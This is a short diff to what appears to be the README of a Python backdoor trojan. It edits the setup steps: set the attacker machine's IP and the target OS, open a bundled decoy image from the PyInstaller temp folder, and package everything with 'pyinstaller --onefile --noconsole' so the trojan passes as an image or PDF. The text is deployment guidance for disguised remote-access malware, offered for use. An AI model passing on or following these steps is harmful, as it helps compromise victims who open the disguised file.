@@ -46,7 +46,7 @@ Now, the executable is ready for deployment.
 
 Step 1
 
-Edit backdoor_trojan.py
+Edit backdoor_trojan.py for the Correct IP and then edit it as follows
 ```
 filename = "<Filename>"
 temp_folder = sys._MEIPASS + "/"
@@ -59,7 +59,7 @@ img.show()
 ```
 Step 2
 
-Use pyinstaller
+Once the files have been edited for your machine's IP, target's OS, it can be converted to a executable using pyinstaller, or can be used as it is
 ```
 pip3 install pyinstaller
 pyinstaller --add-data "<Full path of the image/pdf>:." --onefile --noconsole backdoor_trojan.py
